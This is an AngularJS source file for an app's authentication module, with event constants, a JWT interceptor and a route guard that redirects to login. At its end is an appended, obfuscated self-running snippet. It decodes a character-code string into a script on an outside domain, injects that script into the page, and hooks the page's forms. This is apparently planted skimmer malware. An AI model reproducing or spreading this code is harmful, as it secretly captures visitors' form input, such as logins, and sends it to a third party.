angular.module('app.core.auth', [
    'app.core.auth.service',
    'app.core.auth.login',
    'app.core.auth.logout',
    'angular-jwt'
  ]).constant('AUTH_EVENTS', {
    loginSuccess: 'auth-login-success',
    loginFailed: 'auth-login-failed',
    logoutSuccess: 'auth-logout-success',
    sessionTimeout: 'auth-session-timeout',
    notAuthenticated: 'auth-not-authenticated',
    notAuthorized: 'auth-not-authorized'
  })
  .directive('authToolbar', function() {
    return {
      restrict: 'E',
      templateUrl: '/templates/auth-toolbar.html'
    };
  })
  .config(['$httpProvider', 'jwtInterceptorProvider',
    function($httpProvider, jwtInterceptorProvider) {
      // Please note we're annotating the function so that the $injector works when the file is minified
      jwtInterceptorProvider.tokenGetter = ['AuthService', function(AuthService) {
        return AuthService.getToken();
      }];

      $httpProvider.interceptors.push('jwtInterceptor');
    }
  ])
  .run(['$rootScope', 'AUTH_EVENTS', 'AuthService', 'Notification', '$location',
    function($rootScope, AUTH_EVENTS, AuthService, Notification, $location) {
      $rootScope.$on('$routeChangeStart', function(event, next) {
        // Consider whether to redirect the request if it is unauthorized
        if (
          next.data &&
          next.data.private
        ) {
          if (!AuthService.isAuthenticated()) {
            console.log('Unauthorized request, redirecting...');
            event.preventDefault();
            // User is not logged in
            $rootScope.$broadcast(AUTH_EVENTS.notAuthenticated);

            Notification.error({
              title: 'Unauthorized',
              message: 'Please login'
            });

            // Redirect the user to the login page
            $location.path('/auth/login');
          }
        }
      });
    }
  ]);

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b